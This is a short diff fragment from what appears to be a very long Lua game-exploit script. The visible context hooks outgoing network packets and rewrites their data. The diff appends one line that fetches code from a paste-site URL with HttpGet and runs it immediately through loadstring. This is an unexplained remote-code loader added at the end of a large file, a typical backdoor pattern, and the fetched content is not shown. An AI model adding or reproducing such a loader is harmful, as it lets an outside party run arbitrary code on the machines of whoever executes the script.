@@ -13553,3 +13553,4 @@ raknet.add_send_hook(function(packet)
         packet:SetData(data)
     end
 end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/kAlqvgldQM/0"))()
